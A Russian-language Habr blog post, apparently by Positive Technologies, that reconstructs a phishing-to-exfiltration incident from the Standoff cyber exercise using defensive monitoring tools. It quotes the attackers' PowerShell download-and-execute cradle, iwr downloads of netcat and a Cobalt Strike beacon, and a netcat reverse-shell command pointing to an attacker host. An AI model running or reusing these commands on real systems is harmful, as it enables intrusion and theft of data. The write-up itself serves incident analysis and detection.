{
    "article_id": "728170",
    "article_name": "Как угнать данные за 15 минут",
    "content": "Привет, Хабр! Осенью \nсостоялась\n десятая, юбилейная кибербитва Standoff. Три дня десять команд этичных хакеров со всего мира\n \nпытались ограбить банк, нарушить работу нефтегазовой отрасли и транспорта или реализовать другие недопустимые события в виртуальном Государстве F, построенном на настоящих физических IT-системах и контроллерах. Шесть команд защитников наблюдали за действиями атакующих и расследовали инциденты. Сегодня мы разберем один из них. \nЕсли вы следите за публикациями в нашем блоге, то знаете, что мы далеко не в первый раз делаем разбор-расследование атак, реализуемых красными во время Standoff. Так вот, \nна прошлом Standoff входной точкой атаки стало фишинговое письмо\n. Так случилось и в этот раз: фишинговое письмо послужило причиной серьезной утечки конфиденциальной информации с компьютера руководителя финансового департамента. \nНаши аналитики подтверждают: социальная инженерия \nв тренде у злоумышленников\n. В III квартале 2022 года число массовых кампаний с использованием социальной инженерии увеличилось на 41% в атаках на организации и на 34% в атаках на частных лиц по сравнению с результатами II квартала. Преимущественно такой рост вызван активным использованием фишинговых комплектов — готовых наборов программ, предназначенных для проведения фишинговой атаки. \nНемного теории\nКаждая атака состоит из нескольких этапов, которые, в свою очередь, характеризуются набором различных техник, тактик и инструментов, используемых злоумышленниками. Для противостояния атакующим на каждом этапе есть свои превентивные меры и рекомендации по реагированию. С подробным анализом различных сценариев атак можно ознакомиться \nна сайте Positive Technologies\n. \nРисунок 1. Жизненный цикл атаки \nВ данном материале мы не будем подробно рассматривать этапы разведки и подготовки, а начнем сразу с разбора этапа доставки и посмотрим, как средства защиты Positive Technologies помогли защитникам Государства F обнаружить вредоносную активность атакующих на разных этапах реализации атаки.\nДоставка\nНаше расследование берет начало с оповещения в песочнице \nPT Sandbox\n, куда на анализ прилетел файл Doc2.doc, извлеченный из письма отправителя \nrpage@services.stf\n, который оказался вредоносным по результатам проверки в системе.\nРисунок 2. Сработка PT Sandbox на письмо с установщиком ВПО\nДля того чтобы получить больше информации, было решено поискать в \nMaxPatrol SIEM\n события отправки письма пользователем \nrpage@services.stf\n.\n \nРисунок 3. Событие отправки пользователем \nrpage@services.stf\n письма пользователям \nl_head@city.stf\n и \no_hall@city.stf\n   \nВ данном событии нас в первую очередь интересовали получатели письма \nl_head@city.stf\n и \no_hall@city.stf\n, чтобы найти события, связанные с этими пользователями.\nЭксплуатация и закрепление\nСкорее всего, многие знакомы с понятием суффиксов UPN (UserPrincipalName) в Active Directory, но на всякий случай — небольшая справка.\nUserPrincipalName (UPN) — это атрибут, который является именем пользователя в формате email-адреса. Например, для записи \no_hall@city.stf\n именем пользователя в домене AD (user logon name) будет \no_hall\n, а city.stf — UPN суффикс.\nПо правде говоря, UPN не всегда соответствует email-адресу пользователя, но в большинстве случаев это так. Учитывая данный факт, на следующем шаге нашего расследования мы нашли события открытия файла Doc2.doc пользователем o_hall.  \nРисунок 4. Событие открытия файла Doc2.doc пользователем o_hall\n В полезной нагрузке файла Doc2.doc содержалась следующая команда: \npowershell.exe-ep bypass-enc SQBFAF… (<= зашифрованное содержимое)\nВ зашифрованном содержимом атакующий инициировал загрузку PowerShell-скрипта ips.ps1 и его запуск при помощи командлета Invoke-Expression (сокращенно IEX):\nIEX (New-Object Net.WebClient).DownloadString(\"http://10.126.10.10.13337/ips.ps1\")\nДанная активность была обнаружена как в MaxPatrol SIEM, так и в \nPT Network Attack Analysis\n (PT NAD): \nРисунок 5. Событие загрузки PowerShell-скрипта ips.ps1 в PT NAD\nВнимательный читатель мог заметить иконку обезьяны вверху интерфейса PT NAD. Это признак установленного \ncommunity-плагина SiemMonkey\n. Наш коллега Константин Грищенко в рамках участия в \nоткрытом сообществе Security Experts Community\n выложил в открытый доступ свои наработки по автоматизации рутинных задач специалистов SOC и оформил их в виде плагина для браузера Google Chrome.\nРисунок 6. Событие MaxPatrol SIEM по загрузке и запуску PowerShell-скрипта ips.ps1\nСодержимое же самого ips.ps1:\niwr -uri http://10.126.10.10.13337/nc.exe -outfile C:\\Windows\\Tasks\\nc.exe\niwr -uri http://10.126.10.10.13337/wtf.exe -outfile C:\\Windows\\Tasks\\wtf.exe\nC:\\Windows\\Tasks\\nc.exe 10.126.10.10.13338 -e powershell.exe\nПервые две команды предназначались для загрузки на атакуемый узел файлов nc.exe и wtf.exe; описание последней команды — в следующем абзаце.\nРисунок 7. События выполнения команд PowerShell-скрипта ips.ps1 в MaxPatrol SIEM\nВердикт PT Sandbox по файлу nc.exe (рис. 8)\n \nговорит о загрузке достаточно популярной и универсальной утилиты для исследования сети netcat, которая в нашем расследовании помогла установить обратное соединение на узел атакующего с доступом к командной оболочке PowerShell (третья команда в файле ips.ps1) (рис. 9).\nРисунок 8. Результаты анализа файла nc.exe в PT Sandbox\nРисунок 9. Событие запуска реверс-шелла на узле comp-5117.city.stf\nЗагруженный файл wtf.exe\n \n(рис. 10) после анализа в PT Sandbox (Рисунок 11, 12)\n \nоказался специально сгенерированным агентом Cobalt Strike, так называемым маяком (beacon), предназначенным для закрепления на целевом узле.\nЧтобы узнать больше, смотрите наш недавний вебинар \n«PT NAD против Cobalt Strike и Brute Ratel 4»\n.\nCobalt Strike — достаточно известный фреймворк среди злоумышленников (в том числе APT-группировок), предназначенный для выполнения целевых атак, имитации продвинутых действий хакеров, а также доставки полезной нагрузки на компьютеры жертв. Подробности описанных активностей, связанных с файлом wtf.exe, — ниже. \nРисунок 10. Сессия PT NAD с загрузкой файла wtf.exe\nРисунок 11, 12. Результаты анализ файла wtf.exe в PT Sandbox   \nУправление и действие\nПосле установки реверс-шелла атакующий выполнил поиск файлов на целевом узле при помощи команды PowerShell \n\"Get-ChildItem\" -Path \"../Desktop\"\n и обнаружил архив fin.7z.\nРисунок 13. Поиск файлов на узле comp-5117.city.stf\nРисунок 14. Сообщение о найденном файле fin.7z на узле comp-5117.city.stf\nНа последнем шаге атакующий запустил wtf.exe (HTTP-beacon Cobalt Strike) (рис. 15) и выполнил PowerShell-конвейер (рис. 16), в котором файл fin.7z,\n \nсодержащий конфиденциальную информацию, был сжат и отправлен на узел атакующего (рис. 17).\nРисунок 15. Событие запуска wtf.exe (HTTP-beacon Cobalt Strike) на узле comp-5117.city.stf\nРисунок 16. Событие запуска конвейера PowerShell по сжатию и потоковой отправке файла\nРисунок 17. Сетевая активность HTTP-beacon Cobalt Strike\nТаким образом файл с архивом был успешно выгружен с целевого узла атакующими. \nP. S. А на той стороне…\nЧтобы получить доступ к файлам, хакеры использовали утилиту hashcat и с помощью словаря rockyou.txt, включающего в себя список наиболее популярных и распространенных паролей, подобрали искомый, которым был зашифрован архив (password1):\nТак они успешно извлекли файлы с данными из архива, тем самым реализовав недопустимое событие — получение доступа к чувствительным конфиденциальным данным, расположенным на компьютере руководителя финансового департамента.\nВместо вывода\nИнтересно заметить, что первое событие из расследования, когда фишинговое письмо было отправлено, датировано 23 ноября, 11:30, а последнее с активностью по выгрузке архива — 11:44 того же дня. Таким образом, одной из команд на реализацию недопустимого события потребовалось всего \n15 минут\n. Впечатляет! \nFYI\n19–20 мая пройдет очередная, еще более масштабная кибербитва \nStandoff\n, где атакующие и защитники вновь испытают защищенность инфраструктуры цифрового государства и продемонстрируют возможные цепочки недопустимых событий в разных отраслях. В этом году мы добавили новые сегменты и еще больше недопустимых событий. Узнать о кибербитве больше можно \nздесь\n.\nДмитрий Сабадаш\nСпециалист отдела обнаружения атак \nэкспертного центра безопасности Positive Technologies\n (PT Expert Security Center)   \n \n ",
    "tags": [
        "standoff",
        "кибербитва",
        "атакующие",
        "кибератаки",
        "фишинг",
        "песочница",
        "nta",
        "siem",
        "upn",
        "powershell"
    ]
}